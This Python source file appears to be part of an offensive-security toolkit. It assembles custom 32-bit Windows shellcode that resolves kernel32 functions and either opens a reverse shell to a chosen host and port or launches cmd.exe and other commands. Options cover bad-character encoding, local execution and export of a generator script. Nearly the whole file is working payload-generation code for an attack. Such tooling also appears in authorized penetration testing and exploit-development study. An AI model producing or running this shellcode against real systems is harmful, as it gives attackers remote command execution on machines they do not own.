"""
Generate custom shellcode payloads for Windows targets.

This module provides building blocks to create custom shellcode payloads
for Windows systems. It includes functions for finding and resolving API functions,
network operations, process creation, and command execution.

Features:
- API Function Resolution: Functions to locate and resolve Windows API functions
- Network Operations: Socket creation and connection for reverse shells
- Process Operations: Functions to create and execute processes
- Command Execution: Execute commands via cmd.exe or WinExec
- Utility Functions: Helper functions for shellcode generation and manipulation

Usage examples:
- Create a reverse shell connecting to a remote host
- Generate shellcode for command execution
- Find and call Windows API functions dynamically

Author: wh1rl3y
Date: 2025-07-07
"""

# Imports
import ctypes, struct, textwrap
from keystone import Ks, KS_ARCH_X86, KS_MODE_32
import sys

import argparse
from utils import *

DEFAULT_COMMAND = ['cmd.exe']
DEFAULT_EXEC_FUNCTION = 'CreateProcessA'


# Argument Parsing
def parse_arguments():
    parser = argparse.ArgumentParser(description='Command generator script')
    parser.add_argument('-c', '--command', action='append', default=[],
                        help='Commands to execute (can be used multiple times)')
    parser.add_argument('-l', '--lhost', type=str, help='Local host IP address')
    parser.add_argument('-p', '--lport', type=int, help='Local port number')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable debug printing')
    parser.add_argument('-var', '--variable', type=str, default='buf', help='Variable name to be used')
    parser.add_argument('-lang', '--language', type=str, choices=['python', 'c++'], default='python',
                        help='Output programming language (python or c++)')
    parser.add_argument('-a', '--assembly', action='store_true', help='Print assembly in full', default=False)
    parser.add_argument('-e', '--execute', action='store_true', help='Execute commands after building', default=False)
    parser.add_argument('-f', '--force_break', action='store_true', help='Add int 3 to assembly to break on start',
                        default=False)
    parser.add_argument('-ff', '--force_break_functions', action='store_true',
                        help='Add int 3 to assembly to break in key functions', default=False)
    parser.add_argument('-b', '--bad_char', action='append', nargs=2, metavar=('HEX', 'METHOD'),
                        help='Bad character with hex value and method (neg/add[n]/dec[n])')
    parser.add_argument('-py', '--python_script', type=str,
                        help='Create a clean Python script that generates the shellcode', default=None)
    parser.add_argument('-ex', '--exec', type=str, help='Execution function to use',
                        choices=['CREATE_PROCESS', 'WIN_EXEC'], default='CREATE_PROCESS')
    return parser.parse_args()


# Helper Functions
def validate_arguments(args):
    if args.exec == 'WIN_EXEC' and (args.lhost or args.lport):
        print_info('WinExec cannot be used for a reverse shell.', FAIL, 0, True)
        sys.exit()
    if args.lhost and not args.lport or args.lport and not args.lhost:
        print_info('Please provide both lhost and lport.', FAIL, 0, True)
        sys.exit()


def generate_shellcode(args):
    asm_code = create_asm_start(args.force_break)
    asm_code += find_kernel32()
    asm_code += resolve_kernel32_functions(DEFAULT_EXEC_FUNCTION, args.verbose, args.force_break_functions)

    if args.lhost and args.lport:
        ip_hex = get_ip_hex(args.lhost)
        if not ip_hex:
            print_info(f'Invalid IP address: {args.lhost}', FAIL, 0, True)
            sys.exit()
        port_hex = get_port_hex(args.lport)
        asm_code += load_ws2_32_and_resolve_symbols()
        asm_code += create_socket_and_connect(ip_hex, port_hex)
    else:
        for command in args.command or DEFAULT_COMMAND:
            cmd_chunks = change_command_to_memory_hex(command, [['00', 'neg']], args.verbose)
            asm_code += create_command_string(cmd_chunks, 0, args.verbose, args.force_break_functions)
            asm_code += create_startup_info_a(0)
            asm_code += create_process_a(0)

    return asm_code


def compile_and_execute_shellcode(asm_code, args):
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    try:
        encoding, count = ks.asm(asm_code)

        sh = b""
        for e in encoding:
            sh += struct.pack("B", e)

        shellcode = bytearray(sh)

        print_shellcode(shellcode, args.language)
        if args.execute:
            execute_shellcode(shellcode)
        if args.python_script:
            generate_python_script(asm_code, args.python_script)
    except Exception as e:
        print_info(f'Failed to compile the assembly: {e}', FAIL, 0, True)


# Main Function
def main():
    args = parse_arguments()
    validate_arguments(args)
    asm_code = generate_shellcode(args)
    compile_and_execute_shellcode(asm_code, args)


# Entry Point
if __name__ == "__main__":
    main()
